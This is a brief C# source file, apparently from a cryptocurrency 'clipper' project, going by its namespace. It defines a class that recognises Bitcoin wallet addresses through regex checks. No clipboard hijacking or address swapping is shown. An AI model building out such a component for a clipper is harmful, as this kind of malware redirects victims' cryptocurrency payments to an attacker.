using System.Text.RegularExpressions;
using CryptoClipper.Models;
using CryptoClipper.Utils;

namespace CryptoClipper.Wallets;

public sealed partial class BitcoinMatcher : IWalletPattern
{
    public CoinType CoinType => CoinType.Bitcoin;

    public bool IsMatch(string address) =>
        RegexPatterns.BitcoinLegacy().IsMatch(address) ||
        RegexPatterns.BitcoinSegwit().IsMatch(address) ||
        RegexPatterns.BitcoinBech32().IsMatch(address);
}
